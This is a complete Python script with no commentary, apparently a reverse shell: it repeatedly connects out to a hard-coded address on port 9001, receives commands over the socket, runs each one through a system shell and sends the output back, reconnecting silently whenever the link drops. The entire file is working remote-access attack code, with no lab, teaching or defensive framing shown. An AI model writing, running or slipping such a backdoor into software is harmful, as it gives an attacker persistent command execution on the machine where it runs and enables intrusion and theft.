#!/usr/bin/env python3
import socket
import subprocess
import os

host = '192.168.1.110'
port = 9001

while True:
    try:
        s = socket.socket()
        s.connect((host, port))
        
        while True:
            cmd = s.recv(1024).decode().strip()
            
            if cmd == "quit":
                break
            
            # Execute command
            try:
                if cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    result = f"Changed to: {os.getcwd()}"
                else:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
                
                s.send(result.encode())
            except Exception as e:
                s.send(str(e).encode())
                
    except:
        continue